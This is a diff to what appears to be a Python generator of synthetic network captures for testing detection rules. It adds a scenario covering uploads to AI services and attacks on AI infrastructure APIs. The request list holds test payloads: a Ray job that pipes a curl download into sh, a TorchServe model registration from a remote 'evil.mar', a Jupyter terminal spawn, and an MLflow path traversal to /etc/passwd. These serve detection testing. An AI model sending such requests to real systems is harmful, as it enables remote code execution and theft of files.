@@ -2006,6 +2006,55 @@ def gen_scan_reverse(out):
     cap.write(os.path.join(out, "scan_reverse.pcap"))
 
 
+
+# --------------------------------------------------------------------------- 33 AI 관련 위협
+
+def gen_ai_threats(out):
+    """AI 서비스 업로드: .260 chat.openai.com 으로 4MB x 3(탐지), .261 api.anthropic.com 작은 요청(미탐),
+    .262 AI 아닌 사이트로 30MB(미탐).
+    서버의 AI API: DB 서버 .270(1433 응답) -> api.openai.com(탐지), KDC .10(88/udp 응답) ->
+    generativelanguage.googleapis.com(탐지), PC .272 -> api.openai.com(미탐), .270 -> www.example.com(미탐).
+    AI 인프라 관리 API(.280): Ray 작업 제출(.281, 탐지)·조회(미탐), Ollama pull(.282, 탐지)·generate(미탐),
+    TorchServe URL 등록(.283, 탐지), Jupyter 터미널(.284, 탐지), MLflow 경로 조작(.285, 탐지),
+    외부 93.184.215.170 의 Ray 작업 제출(탐지, source=external)."""
+    mb = 1000 * 1000
+    cap = Capture()
+    t = T0 + 1
+    for _ in range(3):
+        t = tls_session(cap, "10.0.2.60", "93.184.215.171", t + 5, sni="chat.openai.com", upload_skip=4 * mb)
+    for _ in range(5):
+        t = tls_session(cap, "10.0.2.61", "93.184.215.172", t + 5, sni="api.anthropic.com")
+    t = tls_session(cap, "10.0.2.62", "93.184.215.173", t + 5, sni="www.example.com", upload_skip=30 * mb)
+    t = tcp_established(cap, "10.0.0.50", "10.0.2.70", 1433, t + 5)
+    t = krb_logon_ok(cap, "10.0.0.51", "user01", t + 5)
+    t = tls_session(cap, "10.0.2.70", "93.184.215.174", t + 5, sni="api.openai.com")
+    t = tls_session(cap, KDC, "93.184.215.175", t + 5, sni="generativelanguage.googleapis.com")
+    t = tls_session(cap, "10.0.2.72", "93.184.215.174", t + 5, sni="api.openai.com")
+    t = tls_session(cap, "10.0.2.70", "93.184.215.176", t + 5, sni="www.example.com")
+    A = "10.0.2.80"
+    reqs = [
+        ("10.0.2.81", 8265, "POST", "/api/jobs/", b'{"entrypoint": "bash -c id"}'),
+        ("10.0.2.81", 8265, "GET", "/api/jobs/", b""),
+        ("10.0.2.82", 11434, "POST", "/api/pull", b'{"name": "llama3"}'),
+        ("10.0.2.82", 11434, "POST", "/api/generate", b'{"model": "llama3", "prompt": "hi"}'),
+        ("10.0.2.83", 8081, "POST", "/models?url=http://93.184.215.177/evil.mar&initial_workers=1", b""),
+        ("10.0.2.84", 8888, "POST", "/api/terminals", b"{}"),
+        ("10.0.2.85", 5000, "GET", "/ajax-api/2.0/mlflow/model-versions/get-artifact?path=..%2F..%2F..%2Fetc%2Fpasswd&name=m&version=1", b""),
+        ("93.184.215.170", 8265, "POST", "/api/jobs/", b'{"entrypoint": "curl http://93.184.215.178/x | sh"}'),
+    ]
+    for src, dport, method, uri, body in reqs:
+        s = Tcp(cap, src, A, dport)
+        t = s.handshake(t + 2)
+        head = "%s %s HTTP/1.1\r\nHost: %s:%d\r\nUser-Agent: python-requests/2.31\r\n" % (method, uri, A, dport)
+        if body:
+            head += "Content-Type: application/json\r\nContent-Length: %d\r\n" % len(body)
+        t = s.client_send(head.encode() + b"\r\n" + body, t)
+        t = s.server_send(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nContent-Type: application/json\r\n\r\n{}", t + 0.02)
+        t = s.close(t + 0.01)
+    cap.tick(T0 + 900)
+    cap.write(os.path.join(out, "ai_threats.pcap"))
+
+
 GENERATORS = [gen_port_scan, gen_host_scan, gen_smb, gen_rdp, gen_ssh, gen_beacon,
               gen_tls_c2, gen_exfil, gen_volume, gen_dga, gen_chain, gen_dns_tunnel, gen_web_attack,
               gen_ntlm_spray, gen_kerberos, gen_outbound_smb,
@@ -2017,7 +2066,7 @@ GENERATORS = [gen_port_scan, gen_host_scan, gen_smb, gen_rdp, gen_ssh, gen_beaco
               gen_bruteforce, gen_heartbleed, gen_dns_elb, gen_web_xss_bf,
               gen_killchain_story, gen_heartbleed_long,
               gen_detect_gap, gen_bruteforce_long, gen_scan_types, gen_tls_beacon_long,
-              gen_scan_reverse]
+              gen_scan_reverse, gen_ai_threats]
 
 
 def main():
